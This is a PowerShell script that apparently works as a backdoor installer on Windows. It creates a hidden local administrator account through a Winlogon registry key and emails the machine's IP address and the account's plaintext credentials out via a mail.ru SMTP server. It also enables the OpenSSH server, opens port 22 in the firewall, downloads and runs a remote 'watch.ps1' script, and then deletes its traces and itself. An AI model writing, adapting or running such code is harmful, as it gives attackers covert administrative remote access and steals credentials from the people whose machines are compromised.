# Randomly generated chars for temp dir and dir's for vbs and reg scripts
$temp_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))


$global:mail_attach = "$env:Username.cfg"


# Email cred's
$global:email = (Get-Content ./7r6lYgoLlv.txt).Trim()
$global:emailp = (Get-Content ./OWEeX45e3U.txt).Trim()
$global:emailp = (ConvertTo-SecureString -String $emailp -AsPlainText -Force)


# Vars for mail
$global:addr = ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress)
$global:user = (Get-Content ./etgtYmwQUO.txt).Trim()
$global:p_plain = (Get-Content ./f4EWj29Hgq.txt).Trim()
$global:p = (ConvertTo-SecureString -String $p_plain -AsPlainText -Force)


# Populating file for mail
Add-Content -Path .\$mail_attach -Value $addr
Add-Content -Path .\$mail_attach -Value $user
Add-Content -Path .\$mail_attach -Value $p_plain



# Local user for "something" and "then excluding them from log in page"
New-LocalUser $user -Password $p -FullName $user -Description $user
Add-LocalGroupMember -Group "Administrators" -Member $user

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user


# Yeah...
Send-MailMessage -From $email -To $email -Subject "test1" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)


# Open SSH and port 22 (add a rule in firewall as well)
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}


# Watching
mkdir $env:Temp/$temp_dir
Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
& $env:Temp/$temp_dir/watch.ps1

Remove-Item .\7r6lYgoLlv.txt
Remove-Item .\etgtYmwQUO.txt
Remove-Item .\f4EWj29Hgq.txt
Remove-Item .\OWEeX45e3U.txt
Remove-Item .\$mail_attach
Remove-Item $PSCommandPath -Force
